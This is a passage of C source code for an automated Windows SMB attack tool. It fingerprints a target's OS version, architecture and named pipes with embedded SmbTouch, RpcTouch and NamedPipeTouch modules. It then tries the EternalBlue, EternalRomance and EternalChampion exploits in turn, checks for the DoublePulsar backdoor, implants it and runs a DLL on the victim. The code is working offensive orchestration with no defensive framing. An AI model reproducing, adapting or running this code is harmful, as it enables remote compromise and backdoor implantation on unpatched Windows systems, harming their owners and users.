        sprintf(pTargetDesc->osVer, "%s_%s", osVer, osSp);
    }
    strcat(pTargetDesc->osArch, osArch);
    strcat(pTargetDesc->osSp, osSp);
    free(pRecvBuf);

    return RPC_TOUCH_SUCCESS;
}

enum _named_pipe_touch_ret_
{
    PIPE_TOUCH_SUCCESS = 0,
    PIPE_TOUCH_ERR_RD_CONF,
    PIPE_TOUCH_ERR_OP_CONF,
    PIPE_TOUCH_ERR_WR_CONF,
    PIPE_TOUCH_ERR_DECODE,
    PIPE_TOUCH_ERR_CRE_PIPE,
    PIPE_TOUCH_ERR_CRE_PROC,
    PIPE_TOUCH_ERR_NO_RES,
    PIPE_TOUCH_ERR_PARSE,
    PIPE_TOUCH_ERR_FAILED,
};
int named_pipe_touch(TARGET_DESC *pTargetDesc)
{
    ENC_RES_DESC encResDesc;
    ANONY_PIPE_DESC pipeDesc;
    int retVal;
    int pid;
    HANDLE hProc;
    char *pRecvBuf = NULL;
    char *pTmp = NULL;
    char *pSplit = NULL;
    int recvBufSize = 0;
    int idx;
    char pipeName[100];
    char tempBuf[10240];
    char confFileBuf[10240];
    char *pStart = NULL;
    char *pEnd = NULL;
    char confFilePath[MAX_PATH];
    char cmdline[MAX_PATH + 50];
    FILE *inFile = NULL;
    FILE *outFile = NULL;

    memset(pipeName, 0x00, sizeof(pipeName));
    memset(tempBuf, 0x00, sizeof(tempBuf));
    memset(confFileBuf, 0x00, sizeof(confFileBuf));
    memset(confFilePath, 0x00, sizeof(confFilePath));
    memset(cmdline, 0x00, sizeof(cmdline));

    //读取配置文件
    inFile = fopen("Namedpipetouch-2.0.0.xml", "rb");
    if(inFile == NULL)
    {
        printf("[-] Failed to open the configuration file.\n");
        return PIPE_TOUCH_ERR_RD_CONF;
    }
    if(fread(confFileBuf, sizeof(char), sizeof(confFileBuf) - 1, inFile) <= 0)
    {
        printf("[-] Failed to read the configuration file.\n");
        fclose(inFile);
        return PIPE_TOUCH_ERR_RD_CONF;
    }
    fclose(inFile);

    if(replace_str(confFileBuf, "_Target_IP_", pTargetDesc->ip) != 0)
    {
        printf("[-] Did not match the substring: _Target_IP_\n");
        return PIPE_TOUCH_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_Port_", pTargetDesc->port) != 0)
    {
        printf("[-] Did not match the substring: _Target_Port_\n");
        return PIPE_TOUCH_ERR_OP_CONF;
    }

    //解密NamedPipeTouch
    encResDesc = get_namedpipetouch();
    if(encResDesc.status != 0)
    {
        printf("[-] Get NamedPipeTouch failed. ErrCode: %d\n", encResDesc.status);
        return PIPE_TOUCH_ERR_DECODE;
    }

    //创建管道
    pipeDesc = create_anony_pipe_with_io();
    if(pipeDesc.status != 0)
    {
        printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
        return PIPE_TOUCH_ERR_CRE_PIPE;
    }

    //输出配置文件
    sprintf(confFilePath, "Namedpipetouch-%s.xml", pTargetDesc->ip);
    outFile = fopen(confFilePath, "wb");
    if(outFile == NULL)
    {
        printf("[-] Failed to create the configuration file.\n");
        return PIPE_TOUCH_ERR_WR_CONF;
    }
    if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
    {
        fclose(outFile);
        remove(confFilePath);
        printf("[-] Failed to write the configuration file.\n");
        return PIPE_TOUCH_ERR_WR_CONF;
    }
    fclose(outFile);

    //启动NamedPipeTouch
    sprintf(cmdline, "--InConfig %s", confFilePath);
    retVal = fork_process(encResDesc.pBufAddr,
                          cmdline,
                          NULL, &pipeDesc.si, &pipeDesc.pi,
                          &pid, &hProc);
    if(retVal != 0)
    {
        printf("[-] Load NamedPipeTouch failed. ErrCode: %d\n", retVal);
        remove(confFilePath);
        return PIPE_TOUCH_ERR_CRE_PROC;
    }

    printf("[+] Named Pipe Touch Subprocess ID: %d\n", pid);
    full_recv_from_anony_pipe(&pipeDesc, &pRecvBuf, &recvBufSize, 100);
    terminal_process(hProc);
    close_anony_pipe(&pipeDesc);
    remove(confFilePath);
    if(pRecvBuf == NULL)
    {
        printf("[-] Named Pipe Touch did not return results.\n");
        return PIPE_TOUCH_ERR_NO_RES;
    }

    pTmp = strstr(pRecvBuf, "<config");
    if(pTmp != NULL)
    {
        *pTmp = NULL;
    }
    puts(pRecvBuf);
    if(pTmp == NULL)
    {
        return PIPE_TOUCH_ERR_FAILED;
    }

    //提取找到的管道名
    pTmp = strstr(pRecvBuf, "pipes found");
    if(pTmp == NULL)
    {
        printf("[-] Not found the available pipe.\n");
        return PIPE_TOUCH_ERR_FAILED;
    }
    strcat(tempBuf, pTmp);
    pSplit = strtok(tempBuf, "\n");
    while(pSplit != NULL)
    {
        if(strstr(pSplit, "OS Pipe") != NULL)
        {
            pStart = strrchr(pSplit, '\\');
            if(pStart != NULL)
            {
                pStart++;
                for(pEnd = pStart; \
                        *pEnd != ' ' && *pEnd != '\r' && *pEnd != '\n' \
                        && *pEnd != '\t' && *pEnd != NULL; \
                        pEnd++);
                if(pEnd - pStart > 0)
                {
                    memcpy(pipeName, pStart, pEnd - pStart);
                    break;
                }
            }
        }
        pSplit = strtok(NULL, "\n");
    }

    if(strlen(pipeName) <= 0)
    {
        printf("[-] Not found the available pipe.\n");
        return PIPE_TOUCH_ERR_PARSE;
    }
    else
    {
        strcat(pTargetDesc->pipeName, pipeName);
    }

    free(pRecvBuf);

    return PIPE_TOUCH_SUCCESS;
}

enum _smb_touch_ret_
{
    SMB_TOUCH_SUCCESS = 0,
    SMB_TOUCH_ERR_RD_CONF,
    SMB_TOUCH_ERR_OP_CONF,
    SMB_TOUCH_ERR_WR_CONF,
    SMB_TOUCH_ERR_DECODE,
    SMB_TOUCH_ERR_CRE_PIPE,
    SMB_TOUCH_ERR_CRE_PROC,
    SMB_TOUCH_ERR_NO_RES,
    SMB_TOUCH_ERR_PARSE,
    SMB_TOUCH_ERR_FAILED,
};
int smb_touch(TARGET_DESC *pTargetDesc)
{
    ENC_RES_DESC encResDesc;
    ANONY_PIPE_DESC pipeDesc;
    int retVal;
    int pid;
    HANDLE hProc;
    char *pRecvBuf = NULL;
    char *pTmp = NULL;
    char *pSplit = NULL;
    int recvBufSize = 0;
    int idx;
    char osVer[100];
    char osSp[100];
    char osArch[100];
    char tempBuf[10240];
    char confFileBuf[6000];
    char confFilePath[MAX_PATH];
    char cmdline[MAX_PATH + 50];
    FILE *inFile = NULL;
    FILE *outFile = NULL;

    memset(osVer, 0x00, sizeof(osVer));
    memset(osSp, 0x00, sizeof(osSp));
    memset(osArch, 0x00, sizeof(osArch));
    memset(tempBuf, 0x00, sizeof(tempBuf));
    memset(confFileBuf, 0x00, sizeof(confFileBuf));
    memset(confFilePath, 0x00, sizeof(confFilePath));
    memset(cmdline, 0x00, sizeof(cmdline));

    //读取配置文件
    inFile = fopen("Smbtouch-1.1.1.xml", "rb");
    if(inFile == NULL)
    {
        printf("[-] Failed to open the configuration file.\n");
        return SMB_TOUCH_ERR_RD_CONF;
    }
    if(fread(confFileBuf, sizeof(char), sizeof(confFileBuf) - 1, inFile) <= 0)
    {
        printf("[-] Failed to read the configuration file.\n");
        fclose(inFile);
        return SMB_TOUCH_ERR_RD_CONF;
    }
    fclose(inFile);

    if(replace_str(confFileBuf, "_Target_IP_", pTargetDesc->ip) != 0)
    {
        printf("[-] Did not match the substring: _Target_IP_\n");
        return SMB_TOUCH_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_Port_", pTargetDesc->port) != 0)
    {
        printf("[-] Did not match the substring: _Target_Port_\n");
        return SMB_TOUCH_ERR_OP_CONF;
    }

    //解密SmbTouch
    encResDesc = get_smbtouch();
    if(encResDesc.status != 0)
    {
        printf("[-] Get SmbTouch failed. ErrCode: %d\n", encResDesc.status);
        return SMB_TOUCH_ERR_DECODE;
    }

    //创建管道
    pipeDesc = create_anony_pipe_with_io();
    if(pipeDesc.status != 0)
    {
        printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
        return SMB_TOUCH_ERR_CRE_PIPE;
    }

    //输出配置文件
    sprintf(confFilePath, "Smbtouch-%s.xml", pTargetDesc->ip);
    outFile = fopen(confFilePath, "wb");
    if(outFile == NULL)
    {
        printf("[-] Failed to create the configuration file.\n");
        return SMB_TOUCH_ERR_WR_CONF;
    }
    if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
    {
        fclose(outFile);
        remove(confFilePath);
        printf("[-] Failed to write the configuration file.\n");
        return SMB_TOUCH_ERR_WR_CONF;
    }
    fclose(outFile);

    //启动SmbTouch
    sprintf(cmdline, "--InConfig %s", confFilePath);
    retVal = fork_process(encResDesc.pBufAddr,
                          cmdline,
                          NULL, &pipeDesc.si, &pipeDesc.pi,
                          &pid, &hProc);
    if(retVal != 0)
    {
        printf("[-] Load SmbTouch failed. ErrCode: %d\n", retVal);
        remove(confFilePath);
        return SMB_TOUCH_ERR_CRE_PROC;
    }

    printf("[+] Smb Touch Subprocess ID: %d\n", pid);
    full_recv_from_anony_pipe(&pipeDesc, &pRecvBuf, &recvBufSize, 100);
    terminal_process(hProc);
    close_anony_pipe(&pipeDesc);
    remove(confFilePath);
    if(pRecvBuf == NULL)
    {
        printf("[-] Smb Touch did not return results.\n");
        return SMB_TOUCH_ERR_NO_RES;
    }

    pTmp = strstr(pRecvBuf, "<config");
    if(pTmp != NULL)
    {
        *pTmp = NULL;
    }
    puts(pRecvBuf);
    if(pTmp == NULL)
    {
        return SMB_TOUCH_ERR_FAILED;
    }

    //转换为全小写字母
    for(pTmp = pRecvBuf; *pTmp != NULL; pTmp++)
    {
        if(*pTmp >= 'A' && *pTmp <= 'Z')
        {
            *pTmp = *pTmp + 32;
        }
    }
    //puts(pRecvBuf);

    //判断系统版本
    pTmp = strstr(pRecvBuf, "target os version");
    if(pTmp == NULL)
    {
        free(pRecvBuf);
        return SMB_TOUCH_ERR_PARSE;
    }
    if(strstr(pTmp, "windows server") != NULL)
    {
        //目标是服务器
        strcat(osVer, "SERVER");
        if(strstr(pTmp, "2008") != NULL)
        {
            //SERVER_2008
            strcat(osVer, "_2008");
            if(strstr(pTmp, "r2") != NULL)
            {
                //SERVER_2008R2
                strcat(osVer, "R2");
            }
        }
        else if(strstr(pTmp, "2003") != NULL)
        {
            //SERVER_2003
            strcat(osVer, "_2003");
        }
        else if(strstr(pTmp, "2012") != NULL)
        {
            //SERVER_2012
            strcat(osVer, "_2K12");
        }
    }
    else if(strstr(pTmp, "windows 7") != NULL)
    {
        strcat(osVer, "WIN7");
    }
    else if(strstr(pTmp, "vista") != NULL)
    {
        strcat(osVer, "VISTA");
    }
    else if(strstr(pTmp, "windows 8") != NULL)
    {
        strcat(osVer, "WIN8");
    }
    else if(strstr(pTmp, "windows") != NULL)
    {
        strcat(osVer, "XP");
    }
    else
    {
        printf("[-] Unable to confirm system version.\n");
        return SMB_TOUCH_ERR_PARSE;
    }

    //判断目标系统补丁类型
    if(strstr(pTmp, "service pack 1") != NULL || strstr(pTmp, "sp1") != NULL)
    {
        strcat(osSp, "SP1");
    }
    else if(strstr(pTmp, "service pack 2") != NULL || strstr(pTmp, "sp2") != NULL)
    {
        strcat(osSp, "SP2");
    }
    else if(strstr(pTmp, "service pack 3") != NULL || strstr(pTmp, "sp3") != NULL)
    {
        strcat(osSp, "SP3");
    }
    else
    {
        strcat(osSp, "SP0");
    }

    //判断目标架构
    if(strstr(pTmp, "32-bit") != NULL)
    {
        //x86 Architecture
        strcat(osArch, "x86");
    }
    else if(strstr(pTmp, "64-bit") != NULL)
    {
        //x64 Architecture
        strcat(osArch, "x64");
    }
    else
    {
        strcat(osArch, "Unknown");
    }

    if(strcmp(osVer, "XP") == 0)
    {
        if(strcmp(osArch, "x86") == 0)
        {
            if(strcmp(osSp, "SP0") == 0 || strcmp(osSp, "SP1") == 0)
            {
                strcat(pTargetDesc->osVer, "XP_SP0SP1_X86;XP_SP2SP3_X86");
            }
            else
            {
                strcat(pTargetDesc->osVer, "XP_SP2SP3_X86;XP_SP0SP1_X86");
            }
        }
        else if(strcmp(osArch, "x64") == 0)
        {
            if(strcmp(osSp, "SP0") != 0)
            {
                strcat(pTargetDesc->osVer, osVer);
                strcat(pTargetDesc->osVer, "_");
                strcat(pTargetDesc->osVer, osSp);
                strcat(pTargetDesc->osVer, "_");
                strcat(pTargetDesc->osVer, osArch);
            }
            else
            {
                strcat(pTargetDesc->osVer, "XP_SP1_X64;XP_SP2_X64");
            }
        }
        else
        {
            printf("[-] Unable to confirm XP system architecture.\n");
            strcat(pTargetDesc->osVer, "XP_SP2SP3_X86;XP_SP0SP1_X86;XP_SP1_X64;XP_SP2_X64");
        }
    }
    else
    {
        sprintf(pTargetDesc->osVer, "%s_%s", osVer, osSp);
    }
    strcat(pTargetDesc->osArch, osArch);
    strcat(pTargetDesc->osSp, osSp);

    //判断可用管道名
    pTmp = strstr(pRecvBuf, "trying pipes");
    if(pTmp != NULL)
    {
        strcat(tempBuf, pTmp);
        pTmp = tempBuf;
        pTmp[0] = ' ';
        pSplit = strtok(pTmp, "\n");
        while(pSplit != NULL)
        {
            if(pSplit[0] != ' ' && pSplit[0] != '\t')
                break;

            if(strstr(pSplit, "success") != NULL)
            {
                pTmp = strstr(pSplit, "]");
                if(pTmp == NULL)
                {
                    printf("[-] Unable to confirm pipe name.\n");
                    break;
                }
                for(idx = 0; idx < sizeof(pTargetDesc->pipeName) - 1; pTmp++)
                {
                    if(*pTmp >= 'a' && *pTmp <= 'z')
                    {
                        pTargetDesc->pipeName[idx] = *pTmp;
                        idx++;
                    }
                    else
                    {
                        if(strlen(pTargetDesc->pipeName) > 0)
                            break;
                    }
                }
                break;
            }
            pSplit = strtok(NULL, "\n");
        }
    }

    //判断使用的exploit
    pTmp = strstr(pRecvBuf, "[vulnerable]");
    if(pTmp == NULL)
    {
        printf("[-] No exploit is available.\n");
        return SMB_TOUCH_ERR_PARSE;
    }
    if(strstr(osVer, "WIN7") != NULL || strstr(osVer, "2008") != NULL)
    {
        if(strstr(pTmp, "eternalblue") != NULL)
        {
            strcat(pTargetDesc->expName, "EternalBlue");
        }
        if(strstr(pTmp, "eternalromance") != NULL)
        {
            if(strlen(pTargetDesc->expName) > 0)
            {
                strcat(pTargetDesc->expName, ";");
            }
            strcat(pTargetDesc->expName, "EternalRomance");
        }
        if(strstr(pTmp, "eternalchampion") != NULL)
        {
            if(strlen(pTargetDesc->expName) > 0)
            {
                strcat(pTargetDesc->expName, ";");
            }
            strcat(pTargetDesc->expName, "EternalChampion");
        }
    }
    else
    {
        if(strstr(pTmp, "eternalromance") != NULL)
        {
            strcat(pTargetDesc->expName, "EternalRomance");
        }
        if(strstr(pTmp, "eternalblue") != NULL)
        {
            if(strlen(pTargetDesc->expName) > 0)
            {
                strcat(pTargetDesc->expName, ";");
            }
            strcat(pTargetDesc->expName, "EternalBlue");
        }
        if(strstr(pTmp, "eternalchampion") != NULL)
        {
            if(strlen(pTargetDesc->expName) > 0)
            {
                strcat(pTargetDesc->expName, ";");
            }
            strcat(pTargetDesc->expName, "EternalChampion");
        }
    }

    free(pRecvBuf);

    return SMB_TOUCH_SUCCESS;
}

enum _attach_target_ret_
{
    ATTACK_SUCCESS = 0,
    ATTACK_ERR_CONN,
    ATTACK_ERR_TOUCH,
    ATTACK_ERR_EXP,
    ATTACK_ERR_NO_VUL,
    ATTACK_ERR_PING,
    ATTACK_ERR_IMPLANT,
};
int attack_target(TARGET_DESC *pTargetDesc, int retryCount)
{
    int retVal = 0;
    char expName[100];
    char *pExpName = NULL;
    char possibleOsVer[100];
    char *pOsVer = NULL;
    char currOsVer[100];
    char *pSaveOsVerSplit = NULL;
    char *pSaveExpSplit = NULL;
    char *pTmp = NULL;
    int expSucc = 0;
    int dopuSucc = 0;
    int runSucc = 0;
    int idx = 0;
    char currExpName[100];

    memset(expName, 0x00, sizeof(expName));

    //检测是否已存在后门
    puts("------------------------------------------------------------------");
    if((retVal = implant_doublepulsar(pTargetDesc, "Ping")) != 0)
    {
        //后门未安装
        if(retVal == IMP_DOPU_ERR_CONN)
        {
            printf("[-] Failed to establish connection.\n");
            return ATTACK_ERR_CONN;
        }
        printf("[+] Target host does not seem to install DOPU.\n");
    }
    else
    {
        //已安装后门
        printf("[+] Target host has DOPU installed.\n");
        puts("------------------------------------------------------------------");
        //植入DLL
        if(implant_doublepulsar(pTargetDesc, "RunDLL") != 0)
        {
            printf("[-] Doublepulsar Failed.\n");
        }
        else
        {
            printf("[+] Doublepulsar Succeeded.\n");
            puts("------------------------------------------------------------------");
            return ATTACK_SUCCESS;
        }
    }

    //获取目标系统信息
    puts("------------------------------------------------------------------");
    if(strcmp(pTargetDesc->proto, "SMB") == 0)
    {
        if(smb_touch(pTargetDesc) != 0)
        {
            printf("[-] SmbTouch Failed.\n");
            return ATTACK_ERR_TOUCH;
        }
        else
        {
            printf("[+] SmbTouch Succeeded.\n");
        }
    }
    else if(strcmp(pTargetDesc->proto, "NBT") == 0)
    {
        if(rpc_touch(pTargetDesc) != 0)
        {
            printf("[-] RpcTouch Failed.\n");
            return ATTACK_ERR_TOUCH;
        }
        else
        {
            printf("[+] RpcTouch Succeeded.\n");
        }
        puts("------------------------------------------------------------------");
        if(named_pipe_touch(pTargetDesc) != 0)
        {
            printf("[-] NamedPipeTouch Failed.\n");
            return ATTACK_ERR_TOUCH;
        }
        else
        {
            printf("[+] NamedPipeTouch Succeeded.\n");
        }

        if(strlen(pTargetDesc->pipeName) > 0)
        {
            //找到可用的管道
            strcat(pTargetDesc->expName, "EternalRomance");
        }
        else
        {
            //没有找到可用的管道
            printf("[-] Not found the available pipe.\n");
            return ATTACK_ERR_TOUCH;
        }
    }
    else
    {
        printf("[-] Invalid protocol type.\n");
        return ATTACK_ERR_TOUCH;
    }

    puts("------------------------------------------------------------------");
    printf("[+] Target OS Version: %s\n", pTargetDesc->osVer);
    printf("[+] Target OS Architecture: %s\n", pTargetDesc->osArch);
    printf("[+] Available pipe name: %s\n",
           strlen(pTargetDesc->pipeName) > 0 ? pTargetDesc->pipeName : "NULL");
    printf("[+] Vulnerable: %s\n",
           strlen(pTargetDesc->expName) > 0 ? pTargetDesc->expName : "NULL");

    for(idx = 0; idx < retryCount; idx++)
    {
        memset(possibleOsVer, 0x00, sizeof(possibleOsVer));
        strcat(possibleOsVer, pTargetDesc->osVer);
        pOsVer = possibleOsVer;
        if(strlen(possibleOsVer) <= 0)
        {
            printf("[-] No OS.\n");
            return ATTACK_ERR_TOUCH;
        }
        while((pTmp = strtok_r(pOsVer, ";", &pSaveOsVerSplit)) != NULL)
        {
            pOsVer = NULL;
            memset(currOsVer, 0x00, sizeof(currOsVer));
            strcat(currOsVer, pTmp);
            printf("[+] Current OS Version: %s\n", currOsVer);
            memset(pTargetDesc->osVer, 0x00, sizeof(pTargetDesc->osVer));
            strcat(pTargetDesc->osVer, currOsVer);

            memset(expName, 0x00, sizeof(expName));
            strcat(expName, pTargetDesc->expName);
            pExpName = expName;
            if(strlen(expName) <= 0)
            {
                printf("[-] No Vulnerable.\n");
                return ATTACK_ERR_NO_VUL;
            }

            while((pTmp = strtok_r(pExpName, ";", &pSaveExpSplit)) != NULL)
            {
                pExpName = NULL;
                expSucc = 0;
                dopuSucc = 0;
                runSucc = 0;
                memset(currExpName, 0x00, sizeof(currExpName));
                strcat(currExpName, pTmp);
                printf("[+] Current Exploit: %s\n", currExpName);
                //利用exploit
                puts("------------------------------------------------------------------");
                if(strcmp(currExpName, "EternalRomance") == 0)
                {
                    if(exp_eternalromance(pTargetDesc) != 0)
                    {
                        printf("[-] EternalRomance Failed.\n");
                    }
                    else
                    {
                        printf("[+] EternalRomance Succeeded.\n");
                        expSucc = 1;
                    }
                }
                else if(strcmp(currExpName, "EternalBlue") == 0)
                {
                    if(exp_eternalblue(pTargetDesc) != 0)
                    {
                        printf("[-] EternalBlue Failed.\n");
                    }
                    else
                    {
                        printf("[+] EternalBlue Succeeded.\n");
                        expSucc = 1;
                    }
                }
                else if(strcmp(currExpName, "EternalChampion") == 0)
                {
                    if(exp_eternalchampion(pTargetDesc) != 0)
                    {
                        printf("[-] EternalChampion Failed.\n");
                    }
                    else
                    {
                        printf("[+] EternalChampion Succeeded.\n");
                        expSucc = 1;
                    }
                }
                else
                {
                    printf("[-] No Vulnerable.\n");
                    return ATTACK_ERR_NO_VUL;
                }

                if(expSucc)
                {
                    //检测后门是否植入成功
                    puts("------------------------------------------------------------------");
                    if(implant_doublepulsar(pTargetDesc, "Ping") != 0)
                    {
                        printf("[-] Doublepulsar Failed.\n");
                    }
                    else
                    {
                        printf("[+] Doublepulsar Succeeded.\n");
                        dopuSucc = 1;
                    }
                }

                if(expSucc && dopuSucc)
                {
                    puts("------------------------------------------------------------------");
                    //植入DLL
                    if(implant_doublepulsar(pTargetDesc, "RunDLL") != 0)
                    {
                        printf("[-] Doublepulsar Failed.\n");
                    }
                    else
                    {
                        printf("[+] Doublepulsar Succeeded.\n");
                        runSucc = 1;
                    }
                }

                if(expSucc && dopuSucc && runSucc)
                    break;
            }
            if(expSucc && dopuSucc && runSucc)
                break;
        }
        if(expSucc && dopuSucc && runSucc)
            break;
    }

    if(expSucc == 0)
    {
        return ATTACK_ERR_EXP;
    }
    if(dopuSucc == 0)
    {
        return ATTACK_ERR_PING;
    }
    if(runSucc == 0)
    {
        return ATTACK_ERR_IMPLANT;
    }

    puts("------------------------------------------------------------------");
    printf("[+] Target OS Version: %s\n", pTargetDesc->osVer);
    printf("[+] Target OS Architecture: %s\n", pTargetDesc->osArch);
    printf("[+] Available pipe name: %s\n",
           strlen(pTargetDesc->pipeName) > 0 ? pTargetDesc->pipeName : "NULL");
    printf("[+] Vulnerable: %s\n",
           strlen(currExpName) > 0 ? currExpName : "NULL");
    puts("------------------------------------------------------------------");

    return ATTACK_SUCCESS;
}
